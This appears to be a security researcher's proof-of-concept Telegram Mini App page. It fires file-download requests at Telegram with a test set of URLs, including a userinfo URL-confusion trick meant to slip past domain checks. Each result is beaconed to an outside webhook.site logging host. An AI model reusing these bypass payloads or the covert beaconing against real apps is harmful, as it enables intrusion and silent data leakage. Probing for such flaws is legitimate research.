<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>p8</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
body { font-family: monospace; background: #fff; color: #111; padding: 3px; font-size: 8px; margin: 0; }
.log { border-bottom: 1px solid #eee; padding: 1px 0; word-break: break-all; }
.ok { color: green; } .bad { color: #b00; } .dim { color: #888; }
</style>
</head>
<body>
<div id="out"></div>
<script>
const WH = 'https://webhook.site/74aa897d-5aac-4477-890c-179212c5e77b';
const DOM = 'matthewadem.github.io';
const tg = window.Telegram.WebApp;
const out = document.getElementById('out');
let seq = 0;
function blog(msg) {
  const d = document.createElement('div');
  d.className = 'log';
  d.textContent = (++seq) + '| ' + msg;
  out.appendChild(d);
  const i = new Image();
  i.src = WH + '/p8log?n=' + seq + '&m=' + encodeURIComponent(msg).slice(0, 300);
}
function rawEvent(type, data) {
  window.parent.postMessage(JSON.stringify({eventType: type, eventData: data}), '*');
}
blog('p8 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (tg.initData ? 'YES' : 'no'));
tg.ready();
tg.onEvent('file_download_requested', ev => blog('EV status=' + JSON.stringify(ev)));

const CASES = [
  { id: 'tg-userinfo', url: 'https://' + DOM + '@web.telegram.org/k/', fn: 'p8_t1.bin' },
  { id: 'tg-plain',    url: 'https://web.telegram.org/k/',             fn: 'p8_t2.bin' },
  { id: 'ctrl-sub',    url: 'https://webhook.site/matthewadem.github.io/ctrl2.png', fn: 'p8_t3.bin' }
];
let idx = 0;
function next() {
  if (idx >= CASES.length) { blog('MATRIX DONE'); return; }
  const c = CASES[idx++];
  blog('[' + c.id + '] posting ' + c.url);
  rawEvent('web_app_request_file_download', {url: c.url, file_name: c.fn});
  blog('[' + c.id + '] posted');
  setTimeout(next, 20000);
}
if (tg.initData) setTimeout(next, 2000);
</script>
</body>
</html>
